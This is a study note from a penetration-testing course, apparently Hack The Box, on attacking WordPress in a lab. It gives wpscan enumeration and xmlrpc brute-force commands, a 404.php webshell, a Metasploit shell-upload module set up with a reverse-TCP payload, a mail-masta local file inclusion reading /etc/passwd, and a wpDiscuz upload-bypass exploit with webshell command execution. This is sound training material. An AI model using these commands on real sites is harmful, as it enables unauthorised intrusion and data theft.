#Common_Applications 

---
- To enumerate users using **wpscan** we use the following command:
```bash
sudo wpscan --url {URL} --enumerate u --api-token {API_TOKEN}
```

- To bruteforce login using WordPress API after **we know the username** we use the following command:
```bash
emi2024@htb[/htb]$ sudo wpscan --password-attack xmlrpc -t 20 -U {user} -P /usr/share/wordlists/rockyou.txt --url {URL}
```

- We can also edit an uncommon page such as `404.php` to add the following:
![[Pasted image 20241102224353.png]]

- We can then exploit the above shell using the following command:
```bash
emi2024@htb[/htb]$ curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
```


- We can also use the **wp_admin_shell_upload** module from Metasploit to upload a shell and execute it automatically as follows:
```bash
msf6 > use exploit/unix/webapp/wp_admin_shell_upload 

[*] No payload configured, defaulting to php/meterpreter/reverse_tcp

msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhosts blog.inlanefreight.local
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set username john
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set password firebird1
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.14.15 
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhost 10.129.42.195  
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set VHOST 
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set TARGETURI /?p=1 
blog.inlanefreight.local
```


- One of the most vulnerable Wordpress plugins is the **mail-masta** due to discovered **unauthenticated SQL injection** and a **Local File Inclusion**, the 2nd of which is demonstrated below:
```php
<?php 

include($_GET['pl']);
global $wpdb;

$camp_id=$_POST['camp_id'];
$masta_reports = $wpdb->prefix . "masta_reports";
$count=$wpdb->get_results("SELECT count(*) co from  $masta_reports where camp_id=$camp_id and status=1");

echo $count[0]->co;

?>
```

- The `pl` param from the code below can be exploited as follows:
```bash
emi2024@htb[/htb]$ curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

## Vulnerable Plugin: wpDiscuz

- The crux of the vulnerability is a **File Upload Bypass**, which means that we can upload a **PHP** script instead of the expected jpeg file. The exploit script takes 2 parameters: `-u` for the URL and `-p` a path to a valid post:
```bash
emi2024@htb[/htb]$ python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
```

- If the above fails to launch a shell, we can execute a command also using the following:
```bash
emi2024@htb[/htb]$ curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id

GIF689a;

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


## Lab

- I used the following **exploit**(https://www.exploit-db.com/exploits/49967) to launch a shell.
- I couldn't execute any command in the shell but I got a hint on the location of the exploit
- Finally I ran the following command:
```bash
curl -s "http://blog.inlanefreight.local/wp-content/uploads/2024/11/ndfmekbpqgdnlvo-1730830573.9644.php?cmd=cat%20%2Fvar%2Fwww%2Fblog.inlanefreight.local%2Fflag_d8e8fca2dc0f896fd7cb4cb0031ba249.txt"
```
**Note**: Special characters(spaces, backslashes etc ...) were not accepted so we have to **URL encode** them.